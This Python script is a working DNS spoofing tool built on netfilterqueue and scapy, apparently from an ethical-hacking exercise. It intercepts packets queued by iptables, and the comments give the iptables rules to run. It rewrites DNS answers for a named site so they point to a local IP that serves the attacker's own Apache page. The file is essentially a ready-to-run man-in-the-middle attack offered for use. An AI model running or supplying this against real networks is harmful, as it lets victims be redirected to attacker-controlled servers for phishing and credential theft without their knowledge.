#!/usr/bin/env python

# before running the main code we need to run some commands like iptables -I OUTPUT -j NFQUEUE --queue-num 0
# and iptables -I INPUT -j NFQUEUE --queue-num 0
# to start our own web server the command is service apache2 start

import netfilterqueue
import scapy.all as scapy

def process_packet(packet):
    scapy_packet=scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        web = "www.vulnweb.com"  # to run the same code in python 2 you just need to take the  website name as string
        if  web.encode() in qname:
            print("[+] spoofing target")
            answer = scapy.DNSRR(rrname=qname, rdata="192.168.17.129")
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            packet.set_payload(bytes(scapy_packet)) # similar for this


    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
